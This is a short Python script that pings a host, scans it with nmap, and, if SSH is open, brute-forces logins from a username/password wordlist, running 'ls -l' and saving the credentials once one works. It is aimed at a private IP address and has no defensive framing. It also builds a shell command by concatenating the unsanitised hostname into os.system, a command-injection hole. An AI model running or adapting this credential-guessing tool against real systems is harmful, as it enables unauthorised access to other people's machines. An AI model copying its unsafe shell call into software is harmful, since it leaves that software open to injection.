def compute(hostname):
    import os
    if (os.system("ping -c 1 -w 1 " + hostname)) == 0:
        valid = "alive"
        from libnmap.process import NmapProcess
        from libnmap.parser import NmapParser
        nmproc = NmapProcess(hostname, "-sV")
        rc = nmproc.run()
        parsed = NmapParser.parse(nmproc.stdout)
        host = parsed.hosts[0]
        services = []
        status = "Unknown"
        cracked = False
        for serv in host.services:
            services.append(str(serv.port) + "/" + str(serv.service))
            if serv.port == 22:
                import paramiko
                client = paramiko.client.SSHClient()
                client.load_system_host_keys()
                client.set_missing_host_key_policy(paramiko.WarningPolicy)
                uid_list=[]
                pwd_list=[]
                f=open('wordlists/wordlist_1.txt','r')
                for row in f:
                    split = row.split(" ")
                    uid_list.append(split[0])
                    pwd_list.append(split[1])
                for i, uid in enumerate(uid_list):
                    pwd = pwd_list[i]
                    try:
                        if cracked == False:
                            client.connect(hostname,username=uid,password=pwd)
                            stdin, stdout, stderr = client.exec_command('ls -l')
                            status = "Poor SSH Credentials"
                            print("Successfully connected to host", hostname)
                            cracked = True
                            credentials = [uid, pwd]
                        else: break
                    except:
                        print("failed to pwn")
                        status = "Unknown"
                client.close() 
    else:
        valid = "dead"
    return (hostname, valid)

compute("192.168.0.110")
